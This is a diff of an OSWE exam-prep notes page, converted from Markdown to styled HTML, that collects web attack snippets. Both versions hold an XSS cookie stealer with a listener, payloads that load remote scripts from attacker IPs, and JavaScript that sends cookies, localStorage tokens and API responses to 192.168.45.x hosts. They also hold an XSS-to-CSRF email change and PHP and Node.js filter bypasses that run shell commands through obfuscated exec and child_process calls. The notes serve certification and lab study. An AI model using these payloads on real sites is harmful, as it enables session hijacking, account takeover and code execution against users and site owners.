@@ -4,87 +4,198 @@ title: Python Code Snippets
 permalink: /python-code-snippets/
 ---
 
-# OSWE
+<!-- OSWE Reference (HTML) - paste into your .md file -->
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
 
-0. [Concepts](#Concepts)
-4. [Enable Database Debug and Logging](#Enable-Database-Debug-and-Logging)
-    - [Postgres](#Postgres)
-    - [MySQL](#MySQL)
-4. [Python Code Snippets](#Python-Code-Snippets)
-    - [Starting Template](#Starting-Template)
-    - [File Upload](#File-Upload)
-    - [HTTP File Server](#HTTP-File-Server)
-8. [XSS Payloads](#XSS-Payloads)
-   - [Payload 1](#Payload-1)
-   - [Payload 2](#Payload-2)
-   - [XSS Cookies Stealer](#XSS-Cookies-Stealer)
-   - [Leverage XSS to CSRF](#Leverage-XSS-to-CSRF)
-5. [Java Code Snippets](#Java-Code-Snippets)
-6. [Java Insecure Deserialization](#Java-Insecure-Deserialization)
-    - [Methods and Classes](#Methods-and-Classes)
-    - [Identify Insecure Deserialization in Source Code](#Identify-Insecure-Deserialization-in-Source-Code)
-    - [Trace Input Sources](#Trace-Input-Sources)
-    - [Check for Validation or Whitelisting](#Check-for-Validation-or-Whitelisting)
-    - [Inspect Serializable Classes](#Inspect-Serializable-Classes)
-7. [Regex Cheetsheet](#Regex-Cheetsheet)
-8. [XSS Payloads](#XSS-Payloads)
-9. [Bypass PHP Eval Filtering](#Bypass-PHP-Eval-Filtering)
-10. [Bypass Javascript Injection Filters](#Bypass-Javascript-Injection-Filters)
-11. [YSOSerial](#YSOSerial-Payload-Creation)
-    - [.NET](#NET-Version)
-    - [JAVA](#JAVA-Version)
-12. [Report Recommedations](#Report-Recommendations)
-13. [Additional Resources](#Additional-Resources)
+<style>
+  /* klisé-inspired variables (dark theme). Tweak these to match the theme precisely */
+  :root{
+    --bg: #0f1724;
+    --panel: #0b1220;
+    --muted: #98a0b3;
+    --text: #dbe7ff;
+    --accent: #6ad1ff;
+    --accent-2: #9be7a3;
+    --code-bg: #071020;
+    --border: rgba(255,255,255,0.06);
+  }
 
-# Concepts
+  /* Container and typography */
+  .oswe-container{
+    background: var(--bg);
+    color: var(--text);
+    font-family: Inter, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    padding: 28px;
+    line-height: 1.6;
+    border-radius: 8px;
+    box-shadow: 0 6px 24px rgba(2,6,23,0.6);
+  }
 
-### Authentication Bypass: 
+  .oswe-title{
+    color: var(--accent);
+    margin: 0 0 8px 0;
+    font-size: 1.9rem;
+    letter-spacing: -0.5px;
+  }
 
-- SQLi, XSS, Type Juggling, Application Logic Flaws, CORS, CSRF vb.
+  .oswe-subtitle{
+    color: var(--muted);
+    margin: 0 0 18px 0;
+    font-size: 0.95rem;
+  }
 
-### Remote Code Execution:
+  /* TOC */
+  .oswe-toc{
+    background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.0));
+    border: 1px solid var(--border);
+    padding: 14px;
+    border-radius: 8px;
+    margin-bottom: 18px;
+  }
+  .oswe-toc a{ color: var(--accent); text-decoration: none; }
+  .oswe-toc a:hover{ text-decoration: underline; }
 
-- SQLi, Javascript Injection, File upload, Deserialization, SSTI, Prototype Pollution, SSRF.
+  /* Headings */
+  h1, h2, h3, h4 {
+    color: var(--accent-2);
+    margin-top: 20px;
+  }
+  h1 { font-size: 1.6rem; }
+  h2 { font-size: 1.25rem; }
+  h3 { font-size: 1.05rem; color: var(--accent); }
 
-# Enable Database Debug and Logging
+  /* Paragraphs & lists */
+  p, li, pre, code { color: var(--text); }
+  code.inline { background: rgba(255,255,255,0.03); padding: 2px 6px; border-radius: 4px; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Courier New", monospace; font-size: .95em; }
+  ul { margin-left: 1.1rem; }
 
-## Postgres
+  /* Panels */
+  .panel {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    padding: 12px;
+    border-radius: 8px;
+    margin: 10px 0;
+  }
 
-Edit your `/etc/postgresql/<version-num>/main/postgresql.conf`, and change the lines as follows.
+  /* Code blocks (Prism theme file included above) */
+  pre[class*="language-"] {
+    background: var(--code-bg) !important;
+    border-radius: 8px;
+    padding: 14px;
+    overflow: auto;
+    margin: 14px 0;
+    border: 1px solid rgba(255,255,255,0.04);
+    box-shadow: inset 0 -10px 50px rgba(0,0,0,0.6);
+    font-size: 0.95rem;
+  }
+  /* Make code fonts a little larger for readability */
+  pre code { font-family: "Fira Code", "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Monaco, monospace; }
 
-Note: If you didn't find the postgresql.conf file, then just type `$locate postgresql.conf` in a terminal
+  /* small helper styles */
+  .muted { color: var(--muted); font-size: .95rem; }
+  .kbd { background:#0c1723; border:1px solid var(--border); padding:3px 6px; border-radius:6px; font-family: ui-monospace; color:var(--accent); }
+  a { color: var(--accent); }
+</style>
 
-Uncomment these fields:
+<div class="oswe-container">
+  <h1 class="oswe-title">OSWE</h1>
+  <p class="oswe-subtitle">Notes & snippets</p>
 
-1. `#log_directory = 'log'`
-2. `#log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'`
+  <div class="oswe-toc panel">
+    <strong>Contents</strong>
+    <ol>
+      <li><a href="#Concepts">Concepts</a></li>
+      <li><a href="#Enable-Database-Debug-and-Logging">Enable Database Debug and Logging</a>
+        <ul>
+          <li><a href="#Postgres">Postgres</a></li>
+          <li><a href="#MySQL">MySQL</a></li>
+        </ul>
+      </li>
+      <li><a href="#Python-Code-Snippets">Python Code Snippets</a>
+        <ul>
+          <li><a href="#Starting-Template">Starting Template</a></li>
+          <li><a href="#File-Upload">File Upload</a></li>
+          <li><a href="#HTTP-File-Server">HTTP File Server</a></li>
+        </ul>
+      </li>
+      <li><a href="#XSS-Payloads">XSS Payloads</a>
+        <ul>
+          <li><a href="#Payload-1">Payload 1</a></li>
+          <li><a href="#Payload-2">Payload 2</a></li>
+          <li><a href="#XSS-Cookies-Stealer">XSS Cookies Stealer</a></li>
+          <li><a href="#Leverage-XSS-to-CSRF">Leverage XSS to CSRF</a></li>
+        </ul>
+      </li>
+      <li><a href="#Java-Code-Snippets">Java Code Snippets</a></li>
+      <li><a href="#Java-Insecure-Deserialization">Java Insecure Deserialization</a></li>
+      <li><a href="#Regex-Cheetsheet">Regex Cheetsheet</a></li>
+      <li><a href="#Bypass-PHP-Eval-Filtering">Bypass PHP Eval Filtering</a></li>
+      <li><a href="#Bypass-Javascript-Injection-Filters">Bypass Javascript Injection Filters</a></li>
+      <li><a href="#YSOSerial-Payload-Creation">YSOSerial</a></li>
+      <li><a href="#Report-Recommendations">Report Recommedations</a></li>
+      <li><a href="#Additional-Resources">Additional Resources</a></li>
+    </ol>
+  </div>
 
-Change these fileds values:
+  <!-- CONTENT -->
+  <h2 id="Concepts">Concepts</h2>
 
-1. `#log_statement = 'none'` -> `log_statement = 'all'`
-2. `#logging_collector = off` -> `logging_collector = on`
-3. `sudo /etc/init.d/postgresql restart or sudo service postgresql restart`
-4. Fire query in postgresql `select 2+2`.
-5. Find current log in `/var/lib/postgresql/10/main/log`
+  <h3>Authentication Bypass:</h3>
+  <div class="panel">
+    <p class="muted">Common techniques:</p>
+    <ul>
+      <li>SQLi, XSS, Type Juggling, Application Logic Flaws, CORS, CSRF vb.</li>
+    </ul>
+  </div>
 
-## MySQL
+  <h3>Remote Code Execution:</h3>
+  <div class="panel">
+    <p class="muted">Common techniques:</p>
+    <ul>
+      <li>SQLi, Javascript Injection, File upload, Deserialization, SSTI, Prototype Pollution, SSRF.</li>
+    </ul>
+  </div>
 
-Login to the MySQL instance and check out the `general_log` and values, whether is set to ON or OFF:
+  <h2 id="Enable-Database-Debug-and-Logging">Enable Database Debug and Logging</h2>
 
-- `show variables like '%log%';`
+  <h3 id="Postgres">Postgres</h3>
+  <p>Edit your <code class="inline">/etc/postgresql/&lt;version-num&gt;/main/postgresql.conf</code>, and change the lines as follows.</p>
+  <p class="muted">Note: If you didn't find the postgresql.conf file, then just type <code class="kbd">$locate postgresql.conf</code> in a terminal</p>
 
-If it's set to OFF, run the below command to switch it (as the root user!):
+  <p>Uncomment these fields:</p>
+  <ol>
+    <li><code class="inline">#log_directory = 'log'</code></li>
+    <li><code class="inline">#log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'</code></li>
+  </ol>
 
-- `SET GLOBAL general_log = 1;`
+  <p>Change these fields values:</p>
+  <ol>
+    <li><code class="inline">#log_statement = 'none'</code> → <code class="inline">log_statement = 'all'</code></li>
+    <li><code class="inline">#logging_collector = off</code> → <code class="inline">logging_collector = on</code></li>
+    <li>Restart: <code class="kbd">sudo /etc/init.d/postgresql restart</code> or <code class="kbd">sudo service postgresql restart</code></li>
+    <li>Fire query in postgresql: <code class="inline">select 2+2</code>.</li>
+    <li>Find current log in <code class="inline">/var/lib/postgresql/10/main/log</code></li>
+  </ol>
 
-Next, check the `general_log_file` value to see where the actual log file is located using the same.
+  <h3 id="MySQL">MySQL</h3>
+  <p>Login to the MySQL instance and check out the <code class="inline">general_log</code> and values, whether it is set to ON or OFF:</p>
+  <pre><code class="language-sql">show variables like '%log%';</code></pre>
 
-# Python Code Snippets
+  <p>If it's OFF, run as root:</p>
+  <pre><code class="language-sql">SET GLOBAL general_log = 1;</code></pre>
 
-## Starting Template
+  <p>Then check <code class="inline">general_log_file</code> to find where logs are written.</p>
 
-```python
-import requests
+  <h2 id="Python-Code-Snippets">Python Code Snippets</h2>
+
+  <h3 id="Starting-Template">Starting Template</h3>
+  <pre><code class="language-python">import requests
 import string
 import re
 import threading
@@ -139,15 +250,12 @@ if __name__ == "__main__":
     # Main Logic
 
     username, password = register()
-    usercookies = login(username, password) 
-```
+    usercookies = login(username, password) </code></pre>
 
----
+  <hr />
 
-## File Upload With Additional Parameters
-
-```python
-def uploadFile(phpsessid):
+  <h3 id="File-Upload">File Upload With Additional Parameters</h3>
+  <pre><code class="language-python">def uploadFile(phpsessid):
 
     url = "http://10.100.102.73:80/item/updateItem.php"
 
@@ -180,19 +288,17 @@ def uploadFile(phpsessid):
         print(f"[+] Filename {filename} uploaded successfully!")
     else:
         print("[-] File is not uploaded.")
-    return filename
-```
----
+    return filename</code></pre>
 
-## HTTP File Server 1
+  <hr />
 
-```python
-from http.server import BaseHTTPRequestHandler
+  <h3 id="HTTP-File-Server">HTTP File Server 1</h3>
+  <pre><code class="language-python">from http.server import BaseHTTPRequestHandler
 from http.server import HTTPServer
 
 LHOST      = "10.0.0.1"
 WEB_PORT   = 8000
-JS_PAYLOAD = "<script>alert(1)</script>"
+JS_PAYLOAD = "&lt;script&gt;alert(1)&lt;/script&gt;"
 
 def start_web_server():
     class MyHandler(BaseHTTPRequestHandler):
@@ -211,13 +317,10 @@ def start_web_server():
     httpd = HTTPServer((LHOST, WEB_PORT), MyHandler)
     threading.Thread(target=httpd.serve_forever).start()
 
-start_web_server()
-```
+start_web_server()</code></pre>
 
-## HTTP File Server 2
-
-```python
-from http.server import BaseHTTPRequestHandler, HTTPServer
+  <h4>HTTP File Server 2</h4>
+  <pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer
 import threading
 import os
 
@@ -251,13 +354,10 @@ def start_web_server(host="192.168.45.249", port=80, directory="."):
     httpd = HTTPServer((host, port), MyHandler)
     print(f"{success} Serving at {host}:{port}")
     threading.Thread(target=httpd.serve_forever, daemon=True).start()
-    return httpd
-```
+    return httpd</code></pre>
 
-## HTTP File Server 3
-
-```python
-import threading
+  <h4>HTTP File Server 3</h4>
+  <pre><code class="language-python">import threading
 import mimetypes
 
 HOST = '0.0.0.0'
@@ -328,15 +428,12 @@ server_thread = threading.Thread(target=server, daemon=True)
 server_thread.start()
 
 # Main program continues here (non-blocking)
-print(f"{success} File server started in background. Main program running...")
-```
+print(f"{success} File server started in background. Main program running...")</code></pre>
 
-XSS Cookies Stealer
+  <h3 id="XSS-Cookies-Stealer">XSS Cookies Stealer</h3>
+  <pre><code class="language-python">def send_xss_payload():
 
-```python
-def send_xss_payload():
-
-    payload = "<script>document.location='http://10.100.102.67:9001/?c='+document.cookie</script>"
+    payload = "&lt;script&gt;document.location='http://10.100.102.67:9001/?c='+document.cookie&lt;/script&gt;"
     data = {
         'title': 'test',
         'author': 'blabla',
@@ -383,117 +480,82 @@ def listen_for_cookies():
                 print("PHPSESSID not found in received data.")
 
 send_xss_payload()
-listen_for_cookies()
-```
+listen_for_cookies()</code></pre>
 
----
+  <hr />
 
-## Java Insecure Deserialization
+  <h2 id="Java-Insecure-Deserialization">Java Insecure Deserialization</h2>
 
-### Methods and Classes
+  <h3 id="Methods-and-Classes">Methods and Classes</h3>
+  <div class="panel">
+    <ul>
+      <li><code>ObjectInputStream.readObject()</code> - Primary method for deserializing objects in Java.</li>
+      <li><code>ObjectInputStream.readUnshared()</code></li>
+      <li><code>ObjectInputStream.readResolve()</code></li>
+      <li><code>ObjectInputStream.defaultReadObject()</code></li>
+      <li><code>XMLDecoder.readObject()</code></li>
+      <li><code>XStream.fromXML()</code></li>
+      <li><code>ObjectMapper.readValue()</code> (Jackson)</li>
+      <li><code>Kryo.readObject()</code> (Kryo)</li>
+      <li><code>SnakeYAML.load()</code></li>
+    </ul>
+  </div>
 
-- `ObjectInputStream.readObject()` - The primary method for deserializing objects in Java. It reads an object from an ObjectInputStream and reconstructs it.
-- `ObjectInputStream.readUnshared()` - Similar to readObject(), but ensures the deserialized object is not shared with previously deserialized objects.
-- `ObjectInputStream.readResolve()` - A special method that can be defined in a class to replace the deserialized object during deserialization.
-- `ObjectInputStream.defaultReadObject()` - Used within a class’s readObject() method to perform default deserialization of non-transient fields.
-- `XMLDecoder.readObject()` - Used to deserialize objects from XML input, typically in JavaBeans-style XML.
-- `XStream.fromXML()` - Part of the XStream library, used to deserialize objects from XML.
-- `ObjectMapper.readValue()` - Part of the Jackson library, used to deserialize JSON or other formats into Java objects.
-- `Kryo.readObject()` - Part of the Kryo serialization library, used for high-performance serialization/deserialization.
-- `SnakeYAML.load()` - Part of the SnakeYAML library, used to deserialize YAML into Java objects.
+  <h3 id="Identify-Insecure-Deserialization-in-Source-Code">Identify Insecure Deserialization in Source Code</h3>
 
-### Identify Insecure Deserialization in Source Code
+  <p>When auditing source code, follow these steps to identify potential insecure deserialization vulnerabilities:</p>
 
-When auditing source code, follow these steps to identify potential insecure deserialization vulnerabilities:
+  <h4 id="Search-for-Deserialization-Methods">Search for Deserialization Methods</h4>
+  <p>Use code analysis tools (grep, IDE search, SonarQube) to find calls to the methods listed above.</p>
+  <pre><code class="language-bash">grep -r "readObject" .
+grep -r "XStream\.fromXML" .
+grep -r --include="*.java" -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' .</code></pre>
 
-### Search for Deserialization Methods
+  <h4 id="Trace-Input-Sources">Trace Input Sources</h4>
+  <p>Trace inputs to see if untrusted (network, file upload, request params) data flows into deserialization APIs.</p>
 
-- Use code analysis tools (e.g., grep, IDE search, or static analysis tools like SonarQube) to find calls to the methods listed above (e.g., readObject, fromXML, readValue).
-
-Example grep command:
-
-- `grep -r "readObject" .`
-- `grep -r "XStream\.fromXML ."`
-- `grep -r --include="*.java" -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' .`
-- `grep -r --include="*.java" -C 10 -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' . | grep -E -B 10 -A 10 '(HttpServletRequest|System\.in|FileInputStream|FileReader|Socket|ServerSocket|getParameter|getInputStream|getReader|request\.|input\.|stream\.|data\.)'`
-
-### Trace Input Sources
-
-- For each deserialization method, trace the input source (e.g., FileInputStream, Socket, HttpServletRequest).
-- Check if the input is untrusted (e.g., user-uploaded files, network data, or external API responses).
-
-### Check for Validation or Whitelisting:
-
-Look for validation mechanisms, such as:
-
-- Use of ObjectInputFilter (Java 9+) to restrict deserialized classes.
-
-Example:
-
-```java
-ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("allowed.package.*;!*");
+  <h4 id="Check-for-Validation-or-Whitelisting">Check for Validation or Whitelisting</h4>
+  <p>Look for <code>ObjectInputFilter</code> or similar filters. Example:</p>
+  <pre><code class="language-java">ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("allowed.package.*;!*");
 ObjectInputStream ois = new ObjectInputStream(input);
-ois.setObjectInputFilter(filter);
-```
+ois.setObjectInputFilter(filter);</code></pre>
 
-### Inspect Serializable Classes
+  <h4 id="Inspect-Serializable-Classes">Inspect Serializable Classes</h4>
+  <p>Find classes implementing <code>Serializable</code> or <code>Externalizable</code> and inspect special read/write hooks.</p>
 
-- Identify classes implementing Serializable or Externalizable.
-- Check for readObject(), readResolve(), or writeReplace() methods that could be exploited in gadget chains.
-
-### Regex Cheetsheet
-
-Match a START and END delimeter in `r.text`:
-
-```python
-r = requests.post(target, headers=headers, data=xml, proxies=proxies)
+  <h2 id="Regex-Cheetsheet">Regex Cheetsheet</h2>
+  <p>Match a START and END delimeter in <code>r.text</code>:</p>
+  <pre><code class="language-python">r = requests.post(target, headers=headers, data=xml, proxies=proxies)
 match = re.search(f'{re.escape("START DELIMETER")}(.*?){re.escape("END DELIMETER")}', r.text, re.DOTALL)
-print(match[1].strip())
-```
+print(match[1].strip())</code></pre>
 
-### Extract a cookie value from response headers:
-
-Since we are searching for the `JSESSIONID` in r.headers, which is a `CaseInsensitiveDict` (likely from the requests library), you need to extract the Set-Cookie header as a string before applying the regex. Here's a simple and complete solution:
-
-```
-r = requests.post(target, headers=headers, data=xml, proxies=proxies)
+  <p>Extract a cookie value from response headers:</p>
+  <pre><code class="language-python">r = requests.post(target, headers=headers, data=xml, proxies=proxies)
 set_cookie = r.headers.get('Set-Cookie', '')
 match = re.search(r'JSESSIONID=([A-Za-z0-9]+);', set_cookie)
-print(match.group(1))
-```
+print(match.group(1))</code></pre>
 
-## XSS Payloads
+  <h2 id="XSS-Payloads">XSS Payloads</h2>
 
-### Payloads
+  <h3 id="Payload-1">Load External JavaScript</h3>
+  <ul>
+    <li><code>&lt;img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://192.168.118.2/malicious.js'; document.body.appendChild(script);" /&gt;</code></li>
+    <li><code>&lt;img src=x onerror=eval(atob("&lt;BASE64 JAVASCRIPT PAYLOAD&gt;"))&gt;</code></li>
+    <li><code>&lt;audio onloadstart="var s=document.createElement('script');s.src='//192.168.45.163/worked.js';document.head.appendChild(s)"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
+    <li><code>&lt;iframe/srcdoc="&lt;script/src=//192.168.45.163/worked.js&gt;&lt;/script&gt;"&gt;</code></li>
+    <li><code>&lt;strong onafterscriptexecute=""&gt;&lt;script src="http://192.168.45.163/worked.js"&gt;&lt;/script&gt;&lt;/strong&gt;</code></li>
+  </ul>
 
-Load External JavaScript:
+  <h3 id="Payload-2">Load Inline JavaScript</h3>
+  <ul>
+    <li><code>&lt;audio onloadstart="setTimeout(atob('YWxlcnQoIlhTUyIp'))"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
+    <li><code>&lt;audio src=x onerror=Function(atob('YWxlcnQoIlhTUyIp'))()&gt;&lt;/audio&gt;</code></li>
+    <li><code>&lt;audio onloadstart="Function(atob('YWxlcnQoIlhTUyIp'))()"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
+    <li><code>&lt;video src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))&gt;&lt;/video&gt;</code></li>
+  </ul>
 
-- `<img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://192.168.118.2/malicious.js'; document.body.appendChild(script);" />`
-- `<img src=x onerror=eval(atob("<BASE64 JAVASCRIPT PAYLOAD>"))>`
-- `<audio onloadstart="var s=document.createElement('script');s.src='//192.168.45.163/worked.js';document.head.appendChild(s)"><source></audio>`
-- `<iframe/srcdoc="<script/src=//192.168.45.163/worked.js></script>">`
-- `<strong onafterscriptexecute=""><script src="http://192.168.45.163/worked.js"></script></strong>`
-
-
-Load Inline JavaScript:
-
-- `<audio onloadstart="setTimeout(atob('YWxlcnQoIlhTUyIp'))"><source></audio>`
-- `<audio src=x onerror=Function(atob('YWxlcnQoIlhTUyIp'))()></audio>`
-- `<audio onloadstart="Function(atob('YWxlcnQoIlhTUyIp'))()"><source></audio>`
-- `<video src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))></video>`
-
-Send localStorage `token` value from `user` key to remote resource:
-
-```javascript
-fetch(`http://192.168.45.159/data?data=${encodeURIComponent(JSON.parse(localStorage.getItem('user')).token)}`, {mode: 'no-cors'});```
-```
-
-### Leverage XSS to CSRF
-
-Grab csrftoken and send HTTP request including csrftoken in the request:
-
-```javascript
-var req = new XMLHttpRequest();
+  <h3 id="Leverage-XSS-to-CSRF">Leverage XSS to CSRF</h3>
+  <pre><code class="language-javascript">var req = new XMLHttpRequest();
 req.onload = handleResponse;
 req.open('get','/my-account',true);
 req.send();
@@ -502,13 +564,10 @@ function handleResponse() {
     var changeReq = new XMLHttpRequest();
     changeReq.open('post', '/my-account/change-email', true);
     changeReq.send('csrf='+token+'&email=test@test.com')
-};
-```
+};</code></pre>
 
-Filter specific cookie value, and send it back to us:
-
-```javascript
-function getCookieValue(name) {
+  <h3 id="XSS-Cookies-Stealer-js">Filter cookie & send</h3>
+  <pre><code class="language-javascript">function getCookieValue(name) {
     const cookieString = document.cookie;
     const cookies = cookieString.split('; ');
     for (let cookie of cookies) {
@@ -517,91 +576,50 @@ function getCookieValue(name) {
     }
     return null;
 }
-
-// Specify the cookie name you want to retrieve (replace 'auth' with your actual cookie name)
 const cookieName = 'token';
 const cookieValue = getCookieValue(cookieName);
 
 var req2 = new XMLHttpRequest();
 req2.open('GET', 'http://192.168.45.163/' + (cookieValue || ''), false);
-req2.send();
-```
+req2.send();</code></pre>
 
-Send request to specific endpoint with custom header, and send response back to us:
+  <h2 id="Bypass-PHP-Eval-Filtering">Bypass PHP Eval Filtering</h2>
+  <pre><code class="language-php">get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("whoami");
+(new ReflectionFunction(hex2bin("65786563")))->invoke('hostname');</code></pre>
 
-```javascript
-function getCookieValue(name) {
-    const cookieString = document.cookie;
-    const cookies = cookieString.split('; ');
-    for (let cookie of cookies) {
-        const [key, value] = cookie.split('=');
-        if (key === name) return value;
-    }
-    return null;
-}
+  <h2 id="Bypass-Javascript-Injection-Filters">Bypass Javascript Injection Filters</h2>
+  <pre><code class="language-javascript">(function(){module.constructor._load(Buffer.from('6368696c645f70726f63657373','hex').toString()).execSync('ping -c 2');})(); //" 
+(function(){module.constructor._load(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).execSync('ping -c 2');})();//"</code></pre>
 
-// Specify the cookie name you want to retrieve (replace 'auth' with your actual cookie name)
-const cookieName = 'token';
-const cookieValue = getCookieValue(cookieName);
+  <h2 id="YSOSerial-Payload-Creation">YSOSerial</h2>
+  <h3 id="NET-Version">.NET Version</h3>
+  <p><a href="https://github.com/pwntester/ysoserial.net">https://github.com/pwntester/ysoserial.net</a></p>
 
-// Send request using the token
-var req = new XMLHttpRequest();
-req.open('GET', 'http://192.168.136.243:8000/user/groups', false);
-req.setRequestHeader('authorization', 'Bearer ' + token);
-req.send();
-var response = req.responseText;
+  <h3 id="JAVA-Version">JAVA Version</h3>
+  <p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
 
-// Send back the response to us
-var req2 = new XMLHttpRequest();
-req2.open('GET', 'http://192.168.45.163/' + btoa(response), true);
-req2.send();
-```
+  <h2 id="Report-Recommendations">Report Recommedations</h2>
+  <p>For code indentation:</p>
+  <ul>
+    <li>Copy the code straight from VS Code into a 1x1 table in Word</li>
+  </ul>
 
-# Bypass PHP Eval Filtering
+  <h2 id="Additional-Resources">Additional Resources</h2>
+  <p>Further practice & references:</p>
+  <ul>
+    <li><a href="https://github.com/yeswehack/vulnerable-code-snippets">https://github.com/yeswehack/vulnerable-code-snippets</a></li>
+    <li><a href="https://github.com/bmdyy/order">https://github.com/bmdyy/order</a></li>
+    <li><a href="https://github.com/bmdyy/chat.js">https://github.com/bmdyy/chat.js</a></li>
+    <li><a href="https://github.com/bmdyy/tudo">https://github.com/bmdyy/tudo</a></li>
+    <li><a href="https://github.com/bmdyy/testr">https://github.com/bmdyy/testr</a></li>
+    <li><a href="https://github.com/TROUBLE-1/White-box-pentesting">https://github.com/TROUBLE-1/White-box-pentesting</a></li>
+    <li><a href="https://www.vulnhub.com/entry/securecode-1,651">https://www.vulnhub.com/entry/securecode-1,651</a></li>
+    <li><a href="https://github.com/takito1812/web-hacking-playground">https://github.com/takito1812/web-hacking-playground</a></li>
+    <li><a href="https://pentesterlab.com/badges/codereview">https://pentesterlab.com/badges/codereview (paid)</a></li>
+    <li><a href="https://github.com/b1d0ws/OSWE">https://github.com/b1d0ws/OSWE</a></li>
+    <li><a href="https://regexlearn.com/learn/">https://regexlearn.com/learn/</a></li>
+    <li><a href="https://www.nomachine.com/">https://www.nomachine.com/</a></li>
+  </ul>
 
-```php
-get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("whoami");
-(new ReflectionFunction(hex2bin("65786563")))->invoke('hostname');
-```
-
-# Bypass Javascript Injection Filters
-
-```javascript
-(function(){module.constructor._load(Buffer.from('6368696c645f70726f63657373','hex').toString()).execSync('ping -c 2');})(); //"
-(function(){module.constructor._load(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).execSync('ping -c 2');})();//"
-```
-
-# YSOSerial Payload Creation
-
-## NET Version
-
-- `https://github.com/pwntester/ysoserial.net`
-
-## JAVA Version
-
-- `https://github.com/frohoff/ysoserial`
-
-## Report Recommendations
-
-For code identation:
-- `Copy the code straight from VS Code into a 1x1 table in Word`
-
-## Additional Resources
-
-While the course material and labs should be enough to pass the exam, if you want further practice, I can recommend the following:
-- https://github.com/yeswehack/vulnerable-code-snippets
-- https://github.com/bmdyy/order
-- https://github.com/bmdyy/chat.js
-- https://github.com/bmdyy/tudo
-- https://github.com/bmdyy/testr
-- https://github.com/TROUBLE-1/White-box-pentesting
-- https://www.vulnhub.com/entry/securecode-1,651
-- https://github.com/takito1812/web-hacking-playground
-- https://pentesterlab.com/badges/codereview (paid)
-- https://github.com/b1d0ws/OSWE
-
-Regex Learning:
-- https://regexlearn.com/learn/
-
-Debug VM Recommended RDP Software
-- https://www.nomachine.com/
+  <p class="muted">— end of document —</p>
+</div>
